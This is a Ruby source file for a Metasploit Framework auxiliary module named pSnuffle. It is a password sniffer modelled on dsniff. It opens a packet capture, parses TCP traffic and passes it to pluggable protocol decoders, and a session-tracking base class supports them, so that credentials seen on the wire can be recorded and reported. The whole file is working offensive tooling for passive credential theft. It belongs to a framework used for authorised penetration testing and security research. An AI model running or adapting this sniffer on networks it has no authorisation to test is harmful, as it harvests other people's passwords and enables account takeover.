##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
#
##


##
# dsniff was helping me very often. Too bad that it doesn't work correctly
# anymore. Psnuffle should bring password sniffing into Metasploit local
# and if we get lucky even remote. 
#
# Cheers - Max Moser - mmo@remote-exploit.org
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Capture
	
	def initialize
		super(
			'Name'				=> 'pSnuffle Packet Sniffer',
			'Version'           => '$Revision$',
			'Description'       => 'This module sniffs passwords like dsniff did in the past',
			'Author'			=> 'Max Moser  <mmo@remote-exploit.org>',
			'License'			=> MSF_LICENSE,
			'Actions'			=>
				[
					[ 'Sniffer' ],
					[ 'List'    ]
				],
			'PassiveActions' => 
				[
					'Sniffer'
				],
			'DefaultAction'	 => 'Sniffer'
		)

		register_options([
			OptString.new('PROTOCOLS',	[true,	'A comma-delimited list of protocols to sniff or "all".', "all"]),
		], self.class)		
		
		register_advanced_options([
			OptPath.new('ProtocolBase', [true,	'The base directory containing the protocol decoders',
				File.join(Msf::Config.install_root, "data", "exploits", "psnuffle")
			]),
		], self.class)
	end


	def load_protocols
		base = datastore['ProtocolBase']
		if (not File.directory?(base))
			raise RuntimeError,"The ProtocolBase parameter is set to an invalid directory"
		end
		
		@protos = {}
		decoders = Dir.new(base).entries.grep(/\.rb$/).sort
		decoders.each do |n|
			f = File.join(base, n)
			m = ::Module.new
			begin
				m.module_eval(File.read(f, File.size(f)))
				m.constants.grep(/^Sniffer(.*)/) do
					proto = $1
					klass = m.const_get("Sniffer#{proto}")
					@protos[proto.downcase] = klass.new(framework, self)
					
					print_status("Loaded protocol #{proto} from #{f}...")
				end
			rescue ::Exception => e
				print_status("Decoder #{n} failed to load: #{e.class} #{e} #{e.backtrace}")
			end
		end
	end
	
	def run	
		# Load all of our existing protocols
		load_protocols
		
		if(action.name == 'List')
			print_status("Protocols: #{@protos.keys.sort.join(', ')}")
			return
		end
		
		# Remove protocols not explicitly allowed
		if(datastore['PROTOCOLS'] != 'all')
			allowed = datastore['PROTOCOLS'].split(',').map{|x| x.strip.downcase}
			newlist = {}
			@protos.each_key { |k| newlist[k] = @protos[k] if allowed.include?(k) }
			@protos = newlist
		end

		print_status("Sniffing traffic.....")		
		open_pcap
		
		each_packet do |pkt|
			eth = Racket::Ethernet.new(pkt)
			next if not eth.ethertype == 0x0800
			
			ip = Racket::IPv4.new(eth.payload)
			next if not ip.protocol == 6
			
			tcp = Racket::TCP.new(ip.payload)
			next if not (tcp.payload and tcp.payload.length > 0)
			
			data = {:raw => pkt, :eth => eth, :ip => ip, :tcp => tcp}

			@protos.each_key do |k|
				@protos[k].parse(data)
			end
			true
		end
		close_pcap
		print_status("Finished sniffing")
	end
end 

# End module class

# Basic class for taking care of sessions
class BaseProtocolParser
	
	attr_accessor :framework, :module, :sessions, :dport, :sigs

	def initialize(framework, mod)
		self.framework = framework
		self.module    = mod
		self.sessions  = {}
		self.dport     = 0
		register_sigs()
	end

	def parse(pkt)
		nil
	end

	def register_sigs
		self.sigs = {}
	end
	
	#
	# Glue methods to bridge parsers to the main module class
	#
	def print_status(msg)
		self.module.print_status(msg)
	end
	
	def print_error(msg)
		self.module.print_error(msg)
	end
	
	def report_auth_info(*s)
		self.module.report_auth_info(*s)
	end
	
	def report_service(*s)
		self.module.report_service(*s)
	end
		
	def find_session(sessionid)
		sessions.each_key do |ses|
			# Check for cleanup abilities... kills performance in large environments maybe
			if ((sessions[ses][:mtime]-sessions[ses][:ctime])>300)		#When longer than 5 minutes no packet was related to the session, delete it
				# too bad to this session has no action for a long time
				sessions.delete(ses)
			end
		end

		# Does this session already exist?
		if (sessions[sessionid])
			# Refresh the timestamp
			sessions[sessionid][:mtime] = Time.now
		else
			# Create a new session entry along with the host/port from the id
			if (sessionid =~ /^([^:]+):([^-]+)-/s)
				sessions[sessionid] = {
					:host      => $1, 
					:targ_host => $1, 
					:port      => $2, 
					:targ_port => $2, 
					:session   => sessionid, 
					:ctime     => Time.now, 
					:mtime     => Time.now
				}
			end
		end
		
		return sessions[sessionid]
	end
	
	def get_session_src(pkt)	
		return "#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}" if pkt[:tcp]
		return "#{pkt[:ip].dst_ip}:#{pkt[:udp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:udp].src_port}" if pkt[:udp]	
		return "#{pkt[:ip].dst_ip}:0-#{pkt[:ip].src_ip}:0"		
	end
	
	def get_session_dst(pkt)	
		return "#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}" if pkt[:tcp]
		return "#{pkt[:ip].src_ip}:#{pkt[:udp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:udp].dst_port}" if pkt[:udp]	
		return "#{pkt[:ip].src_ip}:0-#{pkt[:ip].dst_ip}:0"		
	end

end

